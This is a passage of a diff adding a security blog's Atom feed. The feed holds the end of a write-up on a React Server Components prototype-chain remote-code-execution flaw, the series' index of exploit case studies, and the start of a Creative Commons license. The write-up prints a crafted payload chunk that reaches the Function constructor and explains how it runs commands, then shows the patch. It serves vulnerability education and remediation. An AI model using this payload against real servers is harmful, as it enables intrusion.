+  &lt;li&gt;&lt;strong&gt;The Oversight:&lt;/strong&gt; React did not check if the property belonged to the object itself. This allowed the parser to climb the &lt;strong&gt;Prototype Chain&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__proto__&lt;/code&gt;) and access inherited properties like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;constructor&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;3-the-kill-chain&quot;&gt;3. The Kill-Chain&lt;/h2&gt;
+
+&lt;h3 id=&quot;phase-1-the-thenable-trap&quot;&gt;Phase 1: The Thenable Trap&lt;/h3&gt;
+&lt;p&gt;The parser has a specific behavior for “Thenables.” Any object containing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.then&lt;/code&gt; property is treated as a Promise. The parser &lt;strong&gt;automatically executes&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.then()&lt;/code&gt; to resolve it. Attackers use this to force the parser into specific execution paths.&lt;/p&gt;
+
+&lt;h3 id=&quot;phase-2-the-gadgets--and-b&quot;&gt;Phase 2: The Gadgets ($@ and $B)&lt;/h3&gt;
+&lt;p&gt;To weaponize the traversal, specific gadgets are used:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$@&lt;/code&gt;: Requests the &lt;strong&gt;raw chunk&lt;/strong&gt; (unparsed), allowing access to internal properties like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;status&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$B&lt;/code&gt;: The &lt;strong&gt;Blob Gadget&lt;/strong&gt;. This triggers the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_response._formData.get()&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;phase-3-the-payload-logic&quot;&gt;Phase 3: The Payload Logic&lt;/h3&gt;
+&lt;p&gt;The attacker constructs a malicious chunk that combines these elements. We control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_response&lt;/code&gt;, and we force the parser to call a getter on our payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// The Official Payload Logic&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;crafted_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;$1:__proto__:then&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;// Hook the Flow&lt;/span&gt;
+  &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unresolved_model&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// Force Logic&lt;/span&gt;
+  &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_response&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+     &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_formData&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// The Weapon: Accessing the Constructor&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;$1:constructor:constructor&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; 
+     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;phase-4-execution&quot;&gt;Phase 4: Execution&lt;/h3&gt;
+
+&lt;p&gt;The chain resolves to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Function(&quot;...&quot;)()&lt;/code&gt;. The attacker passes shell commands into this function constructor, achieving Remote Code Execution.&lt;/p&gt;
+
+&lt;h2 id=&quot;4-the-fix&quot;&gt;4. The Fix&lt;/h2&gt;
+
+&lt;p&gt;The remediation involves restricting property access to the object’s own properties, preventing prototype traversal.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerable Logic (JavaScript):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// BEFORE: JavaScript blindly climbs the prototype chain.&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// If metadata[NAME] is &quot;constructor&quot;, it returns the Function constructor.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;moduleExports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Patched Logic (TypeScript):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-typescript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// PATCHED CODE in React Server Components&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// AFTER: Explicit Property Check using hasOwnProperty.&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hasOwnProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;moduleExports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;moduleExports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hasOwnProperty&lt;/code&gt; only looks at the object itself. It stops the traversal to inherited constructors, neutralizing the attack path.&lt;/p&gt;
+
+&lt;h3 id=&quot;developer-takeaway&quot;&gt;Developer Takeaway&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;JavaScript is too helpful.&lt;/strong&gt; The prototype chain is a powerful feature, but in security contexts, it is a liability. When deserializing untrusted input, never assume property access is safe. Always enforce strict boundaries using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hasOwnProperty&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.create(null)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Immediate Action:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Patch:&lt;/strong&gt; Upgrade to Next.js &lt;strong&gt;14.2.19+&lt;/strong&gt; or &lt;strong&gt;15.0.5+&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Audit:&lt;/strong&gt; Review any custom deserialization logic in your applications.&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>Anatomy of a Bug</title>
+    
+    <link href="http://localhost:4000/anatomy-of-a-bug/"/>
+    <updated>2026-05-14T06:04:45+02:00</updated>
+    <id>http://localhost:4000/anatomy-of-a-bug/</id>
+
+    
+    
+      <category term="Intelligence" label="AnatomyOfABug" />
+    
+    
+    <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Autopsy of a Zero-Day.&lt;/strong&gt;
+High-fidelity technical analyses of critical vulnerabilities, kernel exploits, and architectural failures.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div align=&quot;center&quot;&gt;
+
+  &lt;p&gt;&lt;img src=&quot;https://img.shields.io/badge/License-CC%20BY--ND%204.0-lightgrey.svg&quot; alt=&quot;License: CC BY-ND 4.0&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/badge/Status-Active-brightgreen.svg&quot; alt=&quot;Status: Active&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/badge/Author-%40tralsesec-blue.svg&quot; alt=&quot;Author: @tralsesec&quot; /&gt;&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;h2 id=&quot;-manifesto&quot;&gt;📜 Manifesto&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;span class=&quot;text-green&quot;&gt;#!&lt;/span&gt; Anatomy of a Bug&lt;/strong&gt; is a weekly research series dedicated to deconstructing the most sophisticated exploits in the wild. We move beyond the “what” and focus on the “how” and “why.”&lt;/p&gt;
+
+&lt;p&gt;Each report follows a strict forensic structure:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;The Patient:&lt;/strong&gt; The target system and its architectural context.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;The Diagnosis:&lt;/strong&gt; The precise root cause (e.g., Integer Overflow, Race Condition, Logic Flaw).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;The Kill-Chain:&lt;/strong&gt; Step-by-step reconstruction of the exploit flow (from entry to root/kernel).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;The Fix:&lt;/strong&gt; Code-level remediation and developer takeaways.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;-case-files&quot;&gt;📂 Case Files&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;ID&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Case Title&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;CVE(s)&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Target&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Severity&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/12/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#012&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/12/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;The MAESTRO Breakout: ESXi Ring -1 Compromise&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-22224, CVE-2025-22225, CVE-2025-22226&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;VMware ESXi / VMCI&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;9.3&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/11/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#011&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/11/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;PS5 Hypervisor Collapse&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N/A&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;PlayStation 5 / Star Wars Racer Revenge&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;N/A&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/10/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#010&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/10/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;N8scape&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-68668&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;n8n Workflow Automation Platform&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;9.9&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/9/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#009&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/9/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;AdonisJS BodyParser&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2026-21440&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;AdonisJS Framework (Node.js)&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;9.2&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/8/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#008&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/8/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;EternalBlue&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2017-0144&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows SMBv1&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;9.3&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/7/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#007&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/7/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;MongoBleed&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-14847&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;MongoDB&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;8.7&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/6/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#006&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/6/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;AsyncOS Quarantine Collapse&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-20393&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Cisco Secure Email Gateway&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;10.0&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/5/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#005&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/5/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;FortiWeb Edge Collapse&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-64446, CVE-2025-58034&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Fortinet FortiWeb&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;9.8&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/4/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#004&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/4/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;iOS26 “Liquid Glass” Exploitation Chain&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-14174, CVE-2025-43529, CVE-2025-46285&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;iPhone 12+&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;10.0&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/3/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#003&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/3/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;Firefox IPC Sandbox Escape&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-2857&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mozilla Firefox&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;10.0&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/2/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#002&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/2/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;Lazarus 0day (AppLocker LPE)&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2024-21338&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows AppLocker&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;7.8&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/1/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;#001&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/anatomy-of-a-bug/md/1/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;React2Shell RCE&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2025-55182&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Next.js / React Server Components&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;10.0&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;-methodology&quot;&gt;🔬 Methodology&lt;/h2&gt;
+
+&lt;p&gt;This repository serves as a knowledge base for Exploit Developers, Security Researchers, and Reverse Engineers. The goal is not just to document the vulnerability, but to understand the &lt;strong&gt;mindset&lt;/strong&gt; of the attacker and the &lt;strong&gt;design failures&lt;/strong&gt; of the defender.&lt;/p&gt;
+
+&lt;p&gt;Tools and techniques often referenced:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Static Analysis:&lt;/strong&gt; Binary diffing, control flow graph reconstruction.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Dynamic Analysis:&lt;/strong&gt; Kernel debugging, heap spraying visualization.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;De-obfuscation:&lt;/strong&gt; Unpacking custom malware layers and polyglott payloads.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;️-license--usage&quot;&gt;⚖️ License &amp;amp; Usage&lt;/h2&gt;
+
+&lt;p&gt;This work is licensed under a &lt;strong&gt;Creative Commons Attribution-NoDerivatives 4.0 International License (CC BY-ND 4.0)&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;You are free to:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Share:&lt;/strong&gt; Copy and redistribute the material in any medium or format.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Commercial Use:&lt;/strong&gt; You may use these reports for educational or commercial training purposes.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Under the following terms:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Attribution:&lt;/strong&gt; You must give appropriate credit to &lt;strong&gt;@tralsesec&lt;/strong&gt;, provide a link to the license, and indicate if changes were made (note: changes are not permitted under ND).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;NoDerivatives:&lt;/strong&gt; If you remix, transform, or build upon the material, you may not distribute the modified material. The integrity of the analysis must remain intact.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;See the &lt;a href=&quot;./LICENSE&quot;&gt;LICENSE&lt;/a&gt; file for the full legal text.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;“Security is not inherited. Every layer must defend itself.”&lt;/em&gt; — &lt;em&gt;&lt;span class=&quot;text-green&quot;&gt;#!&lt;/span&gt; Anatomy of a Bug #6&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>Anatomy of a Bug - LICENSE</title>
+    
+    <link href="http://localhost:4000/anatomy-of-a-bug/LICENSE/"/>
+    <updated>2026-05-14T06:04:45+02:00</updated>
+    <id>http://localhost:4000/anatomy-of-a-bug/LICENSE/</id>
+
+    
+    
+      <category term="Intelligence" label="AnatomyOfABug" />
+    
+    
+    <content type="html">&lt;h1 id=&quot;creative-commons-attribution-noderivatives-40-international-public-license&quot;&gt;Creative Commons Attribution-NoDerivatives 4.0 International Public License&lt;/h1&gt;
+
+&lt;p&gt;By exercising the Licensed Rights (defined below), You accept and agree to be bound by the terms and conditions of this Creative Commons Attribution-NoDerivatives 4.0 International Public License (“Public License”). To the extent this Public License may be interpreted as a contract, You are granted the Licensed Rights in consideration of Your acceptance of these terms and conditions, and the Licensor grants You such rights in consideration of benefits the Licensor receives from making the Licensed Material available under these terms and conditions.&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1--definitions&quot;&gt;Section 1 – Definitions.&lt;/h2&gt;
+
+&lt;p&gt;a. &lt;strong&gt;Adapted Material&lt;/strong&gt; means material subject to Copyright and Similar Rights that is derived from or based upon the Licensed Material and in which the Licensed Material is translated, altered, arranged, transformed, or otherwise modified in a manner requiring permission under the Copyright and Similar Rights held by the Licensor.
+b. &lt;strong&gt;Copyright and Similar Rights&lt;/strong&gt; means copyright and/or similar rights closely related to copyright including, without limitation, performance, broadcast, sound recording, and Sui Generis Database Rights.
+c. &lt;strong&gt;Licensed Material&lt;/strong&gt; means the artistic or literary work, database, or other material to which the Licensor applied this Public License.
+d. &lt;strong&gt;Licensed Rights&lt;/strong&gt; means the rights granted to You subject to the terms and conditions of this Public License.
+e. &lt;strong&gt;Licensor&lt;/strong&gt; means the individual(s) or entity(ies) granting rights under this Public License (tralsesec).
+f. &lt;strong&gt;Share&lt;/strong&gt; means to provide material to the public by any means or process that requires permission under the Licensed Rights.&lt;/p&gt;
+
+&lt;h2 id=&quot;section-2--scope&quot;&gt;Section 2 – Scope.&lt;/h2&gt;
+
+&lt;ol&gt;
